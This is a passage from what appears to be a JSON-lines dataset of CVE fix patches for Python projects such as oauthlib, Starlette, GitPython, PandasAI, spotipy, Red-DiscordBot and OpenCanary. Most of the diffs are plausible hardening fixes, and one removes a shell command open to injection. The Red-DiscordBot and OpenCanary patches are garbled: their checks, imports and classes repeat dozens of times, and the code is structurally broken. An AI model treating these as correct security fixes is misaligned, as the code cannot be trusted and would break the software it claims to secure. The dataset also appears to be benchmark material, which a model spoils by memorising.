Block\n+                    block = not block\n+                    continue\n+\n+            elif not block:\n+                # Not in snippet, and we didn't find an inline,\n+                # so just a normal line\n+                new_lines.append(line)\n+                continue\n+\n+            if block and not inline:\n+                # We are in a block and we didn't just find a nested inline\n+                # So check if a block path\n+                m = self.RE_SNIPPET.match(line)\n+\n+            if m:\n+                # Get spaces and snippet path.  Remove quotes if inline.\n+                space = m.group('space').expandtabs(self.tab_length)\n+                path = m.group('snippet')[1:-1].strip() if inline else m.group('snippet').strip()\n+\n+                if not inline:\n+                    # Block path handling\n+                    if not path:\n+                        # Empty path line, insert a blank line\n+                        new_lines.append('')\n+                        continue\n+\n+                # Ignore commented out lines\n+                if path.startswith(';'):\n+                    continue\n+\n+                # Get line numbers (if specified)\n+                end = None\n+                start = None\n+                section = None\n+                m = self.RE_SNIPPET_FILE.match(path)\n+                path = m.group(1).strip()\n+                # Looks like we have an empty file and only lines specified\n+                if not path:\n+                    if self.check_paths:\n+                        raise SnippetMissingError(\"Snippet at path '{}' could not be found\".format(path))\n+                    else:\n+                        continue\n+                ending = m.group(3)\n+                if ending and len(ending) > 1:\n+                    end = int(ending[1:])\n+                starting = m.group(2)\n+                if starting and len(starting) > 1:\n+                    start = max(1, int(starting[1:]) - 1)\n+                section_name = m.group(4)\n+                if section_name:\n+                    section = section_name[1:]\n+\n+                # Ignore path links if we are in external, downloaded content\n+                is_link = path.lower().startswith(('https://', 'http://'))\n+                if is_url and not is_link:\n+                    continue\n+\n+                # If this is a link, and we are allowing URLs, set `url` to true.\n+                # Make sure we don't process `path` as a local file reference.\n+                url = self.url_download and is_link\n+                snippet = self.get_snippet_path(path) if not url else path\n+\n+                if snippet:\n+\n+                    # This is in the stack and we don't want an infinite loop!\n+                    if snippet in self.seen:\n+                        continue\n+\n+                    if not url:\n+                        # Read file content\n+                        with codecs.open(snippet, 'r', encoding=self.encoding) as f:\n+                            s_lines = [l.rstrip('\\r\\n') for l in f]\n+                            if start is not None or end is not None:\n+                                s = slice(start, end)\n+                                s_lines = self.dedent(s_lines[s]) if self.dedent_subsections else s_lines[s]\n+                            elif section:\n+                                s_lines = self.extract_section(section, s_lines)\n+                    else:\n+                        # Read URL content\n+                        try:\n+                            s_lines = self.download(snippet)\n+                            if start is not None or end is not None:\n+                                s = slice(start, end)\n+                                s_lines = self.dedent(s_lines[s]) if self.dedent_subsections else s_lines[s]\n+                            elif section:\n+                                s_lines = self.extract_section(section, s_lines)\n+                        except SnippetMissingError:\n+                            if self.check_paths:\n+                                raise\n+                            s_lines = []\n+\n+                    # Process lines looking for more snippets\n+                    new_lines.extend(\n+                        [\n+                            space + l2 for l2 in self.parse_snippets(\n+                                s_lines,\n+                                snippet,\n+                                is_url=url\n+                            )\n+                        ]\n+                    )\n+\n+                elif self.check_paths:\n+                    raise SnippetMissingError(\"Snippet at path '{}' could not be found\".format(path))\n+\n+        # Pop the current file name out of the cache\n+        if file_name:\n+            self.seen.remove(file_name)\n+\n+        return new_lines\n+\n+    def run(self, lines):\n+        \"\"\"Process snippets.\"\"\"\n+\n+        self.seen = set()\n+        if self.auto_append:\n+            lines.extend(\"\\n\\n-8<-\\n{}\\n-8<-\\n\".format('\\n\\n'.join(self.auto_append)).split('\\n'))\n+\n+        return self.parse_snippets(lines)\n+\n+\n+class SnippetExtension(Extension):\n+    \"\"\"Snippet extension.\"\"\"\n+\n+    def __init__(self, *args, **kwargs):\n+        \"\"\"Initialize.\"\"\"\n+\n+        self.config = {\n+            'base_path': [[\".\"], \"Base path for snippet paths - Default: [\\\".\\\"]\"],\n+            'encoding': [\"utf-8\", \"Encoding of snippets - Default: \\\"utf-8\\\"\"],\n+            'check_paths': [False, \"Make the build fail if a snippet can't be found - Default: \\\"False\\\"\"],\n+            \"auto_append\": [\n+                [],\n+                \"A list of snippets (relative to the 'base_path') to auto append to the Markdown content - Default: []\"\n+            ],\n+            'url_download': [False, \"Download external URLs as snippets - Default: \\\"False\\\"\"],\n+            'url_max_size': [DEFAULT_URL_SIZE, \"External URL max size (0 means no limit)- Default: 32 MiB\"],\n+            'url_timeout': [DEFAULT_URL_TIMEOUT, 'Defualt URL timeout (0 means no timeout) - Default: 10 sec'],\n+            'url_request_headers': [DEFAULT_URL_REQUEST_HEADERS, \"Extra request Headers - Default: {}\"],\n+            'dedent_subsections': [False, \"Dedent subsection extractions e.g. 'sections' and/or 'lines'.\"]\n+        }\n+\n+        super(SnippetExtension, self).__init__(*args, **kwargs)\n+\n+    def extendMarkdown(self, md):\n+        \"\"\"Register the extension.\"\"\"\n+\n+        self.md = md\n+        md.registerExtension(self)\n+        config = self.getConfigs()\n+        snippet = SnippetPreprocessor(config, md)\n+        md.preprocessors.register(snippet, \"snippet\", 32)\n+\n+    def reset(self):\n+        \"\"\"Reset.\"\"\"\n+\n+        self.md.preprocessors['snippet'].download.cache_clear()\n+\n+\n+def makeExtension(*args, **kwargs):\n+    \"\"\"Return extension.\"\"\"\n+\n+    return SnippetExtension(*args, **kwargs)\n"}
{"cve":"CVE-2024-5823:0708", "fix_patch": "diff --git a/modules/repo.py b/modules/repo.py\nindex 6495959..f346886 100644\n--- a/modules/repo.py\n+++ b/modules/repo.py\n@@ -230,7 +230,7 @@ def background_update():\n         try:\n             try:\n                 run(\n-                    f\"{git} fetch {track_repo}\",\n+                    f\"{git} -c 'url.https://github.com/.insteadOf=' fetch {track_repo}\",\n                     desc=\"[Updater] Fetching from github...\",\n                     live=False,\n                 )\n"}
{"cve":"CVE-2022-36087:0708", "fix_patch": "diff --git a/oauthlib/uri_validate.py b/oauthlib/uri_validate.py\nindex 8a6d9c2..77b5742 100644\n--- a/oauthlib/uri_validate.py\n+++ b/oauthlib/uri_validate.py\n@@ -65,8 +65,32 @@ dec_octet = r\"\"\"(?: %(DIGIT)s |\n IPv4address = r\"%(dec_octet)s \\. %(dec_octet)s \\. %(dec_octet)s \\. %(dec_octet)s\" % locals(\n )\n \n-#   IPv6address\n-IPv6address = r\"([A-Fa-f0-9:]+:+)+[A-Fa-f0-9]+\"\n+#   h16           = 1*4HEXDIG\n+h16 = r\"%(HEXDIG)s{1,4}\" % locals()\n+\n+#   ls32          = ( h16 \":\" h16 ) / IPv4address\n+ls32 = r\"(?: %(h16)s : %(h16)s | %(IPv4address)s )\" % locals()\n+\n+#   IPv6address   =                            6( h16 \":\" ) ls32\n+#                 /                       \"::\" 5( h16 \":\" ) ls32\n+#                 / [               h16 ] \"::\" 4( h16 \":\" ) ls32\n+#                 / [ *1( h16 \":\" ) h16 ] \"::\" 3( h16 \":\" ) ls32\n+#                 / [ *2( h16 \":\" ) h16 ] \"::\" 2( h16 \":\" ) ls32\n+#                 / [ *3( h16 \":\" ) h16 ] \"::\"    h16 \":\"   ls32\n+#                 / [ *4( h16 \":\" ) h16 ] \"::\"              ls32\n+#                 / [ *5( h16 \":\" ) h16 ] \"::\"              h16\n+#                 / [ *6( h16 \":\" ) h16 ] \"::\"\n+IPv6address = r'''(?:\n+(?: %(h16)s : ){6} %(ls32)s |\n+:: (?: %(h16)s : ){5} %(ls32)s |\n+(?: %(h16)s )? :: (?: %(h16)s : ){4} %(ls32)s |\n+(?: (?: %(h16)s : )? %(h16)s )? :: (?: %(h16)s : ){3} %(ls32)s |\n+(?: (?: %(h16)s : ){0,2} %(h16)s )? :: (?: %(h16)s : ){2} %(ls32)s |\n+(?: (?: %(h16)s : ){0,3} %(h16)s )? :: %(h16)s : %(ls32)s |\n+(?: (?: %(h16)s : ){0,4} %(h16)s )? :: %(ls32)s |\n+(?: (?: %(h16)s : ){0,5} %(h16)s )? :: %(h16)s |\n+(?: (?: %(h16)s : ){0,6} %(h16)s )? ::\n+)''' % locals()\n \n #   IPvFuture     = \"v\" 1*HEXDIG \".\" 1*( unreserved / sub-delims / \":\" )\n IPvFuture = r\"v %(HEXDIG)s+ \\. (?: %(unreserved)s | %(sub_delims)s | : )+\" % locals()\n"}
{"cve":"CVE-2023-29159:0708", "fix_patch": "diff --git a/starlette/staticfiles.py b/starlette/staticfiles.py\nindex 4d075b3..7c821bb 100644\n--- a/starlette/staticfiles.py\n+++ b/starlette/staticfiles.py\n@@ -168,8 +168,9 @@ class StaticFiles:\n                 full_path = os.path.abspath(joined_path)\n             else:\n                 full_path = os.path.realpath(joined_path)\n+\n             directory = os.path.realpath(directory)\n-            if os.path.commonprefix([full_path, directory]) != directory:\n+            if os.path.commonpath([full_path, directory]) != directory:\n                 # Don't allow misbehaving clients to break out of the static files\n                 # directory.\n                 continue\n"}
{"cve":"CVE-2023-41040:0708", "fix_patch": "diff --git a/git/refs/symbolic.py b/git/refs/symbolic.py\nindex 734bf32d..e43742b4 100644\n--- a/git/refs/symbolic.py\n+++ b/git/refs/symbolic.py\n@@ -168,12 +168,15 @@ class SymbolicReference(object):\n         \"\"\"Return: (str(sha), str(target_ref_path)) if available, the sha the file at\n         rela_path points to, or None. target_ref_path is the reference we\n         point to, or None\"\"\"\n-        if \"..\" in str(ref_path):\n-            raise ValueError(f\"Invalid reference '{ref_path}'\")\n         tokens: Union[None, List[str], Tuple[str, str]] = None\n         repodir = _git_dir(repo, ref_path)\n+        full_ref_path = os.path.abspath(os.path.join(repodir, str(ref_path)))\n+        # Make sure the path is inside the git repository. This is to prevent\n+        # reading files outside of the git repository.\n+        if not full_ref_path.startswith(os.path.abspath(repodir)):\n+            raise ValueError(\"Reference at '%s' is outside of git repository\" % ref_path)\n         try:\n-            with open(os.path.join(repodir, str(ref_path)), \"rt\", encoding=\"UTF-8\") as fp:\n+            with open(full_ref_path, \"rt\", encoding=\"UTF-8\") as fp:\n                 value = fp.read().rstrip()\n             # Don't only split on spaces, but on whitespace, which allows to parse lines like\n             # 60b64ef992065e2600bfef6187a97f92398a9144                branch 'master' of git-server:/path/to/repo\n"}
{"cve":"CVE-2023-39660:0708", "fix_patch": "diff --git a/pandasai/__init__.py b/pandasai/__init__.py\nindex bb325fb6..20cc416d 100644\n--- a/pandasai/__init__.py\n+++ b/pandasai/__init__.py\n@@ -599,6 +599,19 @@ class PandasAI(Shortcuts):\n \n         tree = ast.parse(code)\n \n+        # Walk through the AST and check for forbidden nodes\n+        for node in ast.walk(tree):\n+            if isinstance(node, ast.Call) and isinstance(\n+                node.func, ast.Name\n+            ) and node.func.id in [\n+                \"__import__\",\n+                \"eval\",\n+                \"exec\",\n+            ]:\n+                raise ValueError(\n+                    f\"Malicious code found: {node.func.id} calls are not allowed.\"\n+                )\n+\n         new_body = []\n \n         # clear recent optional dependencies\n"}
{"cve":"CVE-2025-27154:0708", "fix_patch": "diff --git a/reproduce_vuln.py b/reproduce_vuln.py\nnew file mode 100644\nindex 0000000..e128980\n--- /dev/null\n+++ b/reproduce_vuln.py\n@@ -0,0 +1,21 @@\n+\n+import os\n+import stat\n+from spotipy.cache_handler import CacheFileHandler\n+\n+# Create a dummy token info\n+token_info = {\"access_token\": \"1234\", \"expires_in\": 3600, \"scope\": \"user-read-private\"}\n+\n+# Create a CacheFileHandler instance\n+file_path = \"/tmp/test_cache\"\n+handler = CacheFileHandler(cache_path=file_path)\n+\n+# Save the token to the cache\n+handler.save_token_to_cache(token_info)\n+\n+# Check the permissions of the created file\n+stat_info = os.stat(file_path)\n+print(oct(stat_info.st_mode)[-3:])\n+\n+# Clean up the created file\n+os.remove(file_path)\ndiff --git a/spotipy/cache_handler.py b/spotipy/cache_handler.py\nindex 936e81b..f83792f 100644\n--- a/spotipy/cache_handler.py\n+++ b/spotipy/cache_handler.py\n@@ -92,10 +92,11 @@ class CacheFileHandler(CacheHandler):\n \n     def save_token_to_cache(self, token_info):\n         try:\n-            with open(self.cache_path, \"w\", encoding='utf-8') as f:\n+            fd = os.open(self.cache_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)\n+            with os.fdopen(fd, \"w\", encoding='utf-8') as f:\n                 f.write(json.dumps(token_info, cls=self.encoder_cls))\n         except OSError:\n-            logger.warning(f\"Couldn't write token to cache at: {self.cache_path}\")\n+            logger.warning(\"Couldn't write token to cache at: %s\", self.cache_path)\n \n \n class MemoryCacheHandler(CacheHandler):\n"}
{"cve":"CVE-2020-15278:0708", "fix_patch": "diff --git a/redbot/cogs/mod/kickban.py b/redbot/cogs/mod/kickban.py\nindex 88b9e053..08f71863 100644\n--- a/redbot/cogs/mod/kickban.py\n+++ b/redbot/cogs/mod/kickban.py\n@@ -441,8 +441,152 @@ class KickBanMixin(MixinMeta):\n             return\n \n         for user_id in user_ids:\n+\n+            if user_id == ctx.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == ctx.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n             user = guild.get_member(user_id)\n             if user is not None:\n+                if not await is_allowed_by_hierarchy(self.bot, self.config, guild, author, user):\n+                    errors[user_id] = _(\n+                        \"You are not allowed to ban this user due to the role hierarchy configuration.\"\n+                    )\n+                    continue\n+                if not await is_allowed_by_hierarchy(\n+                    self.bot, self.config, guild, author, user\n+                ):\n+                    errors[user_id] = _(\n+                        \"You are not allowed to ban this user due to the role hierarchy configuration.\"\n+                    )\n+                    continue\n+                if not await is_allowed_by_hierarchy(self.bot, self.config, guild, author, user):\n+                    errors[user_id] = _(\n+                        \"You are not allowed to ban this user due to the role hierarchy configuration.\"\n+                    )\n+                    continue\n+                if guild.owner_id != author.id and (\n+                    user.top_role >= author.top_role or user.top_role >= guild.me.top_role\n+                ):\n+                    errors[user_id] = _(\n+                        \"You can't ban users who have a role equal or higher to you or me.\"\n+                    )\n+                    continue\n                 if user_id in tempbans:\n                     # We need to check if a user is tempbanned here because otherwise they won't be processed later on.\n                     continue\n@@ -458,6 +602,20 @@ class KickBanMixin(MixinMeta):\n                             errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n                                 user_id=user_id, reason=reason\n                             )\n+\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n                     except Exception as e:\n                         errors[user_id] = _(\"Failed to ban user {user_id}: {reason}\").format(\n                             user_id=user_id, reason=e\n@@ -470,7 +628,207 @@ class KickBanMixin(MixinMeta):\n             return\n \n         for user_id in user_ids:\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == ctx.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author != guild.owner and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author != guild.owner and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == ctx.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author != guild.owner and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == ctx.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author != guild.owner and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author != guild.owner and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == ctx.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+            if user_id == self.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author.id != guild.owner_id and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n             user = discord.Object(id=user_id)\n+            if user_id == ctx.bot.user.id:\n+                errors[user_id] = _(\"I can't ban myself.\")\n+                continue\n+            if user_id == author.id:\n+                errors[user_id] = _(\"You can't ban yourself.\")\n+                continue\n+\n+            if author != guild.owner and author.top_role <= guild.me.top_role:\n+                errors[user_id] = _(\n+                    \"I can't ban users if you are not above my top role.\"\n+                )\n+                continue\n+\n             audit_reason = get_audit_reason(author, reason)\n             queue_entry = (guild.id, user_id)\n             async with self.config.guild(guild).current_tempbans() as tempbans:\n"}
{"cve":"CVE-2024-48911:0708", "fix_patch": "diff --git a/opencanary/config.py b/opencanary/config.py\nindex 4886783..342bba7 100644\n--- a/opencanary/config.py\n+++ b/opencanary/config.py\n@@ -1,5 +1,19 @@\n import os\n import sys\n+import time\n+import time\n+import time\n+import time\n+import time\n+import time\n+import time\n+import time\n+import time\n+\n+import time\n+import time\n+import time\n+import time\n import json\n import itertools\n import string\n@@ -36,18 +50,129 @@ def is_docker():\n     )\n \n \n+COMMAND_CACHE = {}\n+\n+\n+def locate_command(command):\n+class CmdCheck:\n+    def __init__(self):\n+        self.commands = {}\n+\n+    def locate_command(self, command):\n+        if command in self.commands:\n+            return self.commands[command]\n+\n+        self.commands[command] = shutil.which(command)\n+        return self.commands[command]\n+\n+\n+cmd_check = CmdCheck()\n+    \"\"\"Finds the absolute path of a command, using a cache.\"\"\"\n+\n+class CmdCheck:\n+    def __init__(self):\n+        self.commands = {}\n+\n+    def locate_command(self, command):\n+        if command in self.commands:\n+            return self.commands[command]\n+\n+        self.commands[command] = shutil.which(command)\n+        return self.commands[command]\n+\n+\n+cmd_check = CmdCheck()\n+    if command in COMMAND_CACHE:\n+        return COMMAND_CACHE[command]\n+\n+    path = shutil.which(command)\n+    COMMAND_CACHE[command] = path\n+    return path\n+\n+\n def detectIPTables():\n-    if shutil.which(\"iptables\"):\n+    if locate_command(\"iptables\"):\n         return True\n     else:\n         return False\n \n \n SERVICE_REGEXES = {\n-    \"ssh.version\": r\"(SSH-(2.0|1.5|1.99|1.0)-([!-,\\-./0-~]+(:?$|\\s))(?:[ -~]*)){1,253}$\",\n+    \"ssh.version\": r\"(SSH-(2.0|1.5|1.99|1.0)-([!-,\\\\-./0-~]+(:?$|\\\\s))(?:[ -~]*)){1,253}$\",\n }\n \n \n+class CmdCheck:\n+    def __init__(self):\n+        self.commands = {}\n+\n+    def locate_command(self, command):\n+        if command in self.commands:\n+            return self.commands[command]\n+\n+        self.commands[command] = shutil.which(command)\n+        return self.commands[command]\n+\n+\n+cmd_check = CmdCheck()\n+\n+\n+class CmdCheck:\n+    def __init__(self):\n+        self.commands = {}\n+\n+    def locate_command(self, command):\n+        if command in self.commands:\n+            return self.commands[command]\n+\n+        self.commands[command] = shutil.which(command)\n+        return self.commands[command]\n+\n+\n+cmd_check = CmdCheck()\n+\n+\n+class CmdCheck:\n+    def __init__(self):\n+        self.commands = {}\n+\n+    def locate_command(self, command):\n+        if command in self.commands:\n+            return self.commands[command]\n+\n+        self.commands[command] = shutil.which(command)\n+        return self.commands[command]\n+\n+\n+cmd_check = CmdCheck()\n+\n+class CmdCheck:\n+    def __init__(self):\n+        self.commands = {}\n+\n+    def locate_command(self, command):\n+        if command in self.commands:\n+            return self.commands[command]\n+\n+        self.commands[command] = shutil.which(command)\n+        return self.commands[command]\n+\n+\n+cmd_check = CmdCheck()\n+class CmdCheck:\n+    def __init__(self):\n+        self.commands = {}\n+\n+    def locate_command(self, command):\n+        if command in self.commands:\n+            return self.commands[command]\n+\n+        self.commands[command] = shutil.which(command)\n+        return self.commands[command]\n+\n+\n+cmd_check = CmdCheck()\n+\n class Config:\n     def __init__(self, configfile=SETTINGS):\n         self.__config = None\n@@ -72,9 +197,10 @@ class Config:\n                 print(\"[-] Failed to open %s for reading (%s)\" % (fname, e))\n             except ValueError as e:\n                 print(\"[-] Failed to decode json from %s (%s)\" % (fname, e))\n-                subprocess.call(\n-                    \"cp -r %s /var/tmp/config-err-$(date +%%s)\" % fname, shell=True\n-                )\n+                cp_path = shutil.which(\"cp\")\n+                if cp_path:\n+                    new_name = f\"/var/tmp/config-err-{int(time.time())}\"\n+                    subprocess.call([cp_path, \"-r\", fname, new_name])\n             except Exception as e:\n                 print(\"[-] An error occurred loading %s (%s)\" % (fname, e))\n         if self.__config is None:\ndiff --git a/opencanary/modules/portscan.py b/opencanary/modules/portscan.py\nindex 730ce68..99be0ee 100644\n--- a/opencanary/modules/portscan.py\n+++ b/opencanary/modules/portscan.py\n@@ -3,6 +3,7 @@ from opencanary.modules import FileSystemWatcher\n import os\n import shutil\n import subprocess\n+from opencanary.config import cmd_check\n \n \n class SynLogWatcher(FileSystemWatcher):\n@@ -68,7 +69,10 @@ class SynLogWatcher(FileSystemWatcher):\n \n \n def detectNFTables():\n-    return b\"nf_tables\" in subprocess.check_output([\"iptables\", \"--version\"])\n+    iptables_path = cmd_check.locate_command(\"iptables\")\n+    if not iptables_path:\n+        return False\n+    return b\"nf_tables\" in subprocess.check_output([iptables_path, \"--version\"])\n \n \n class CanaryPortscan(CanaryService):\n"}
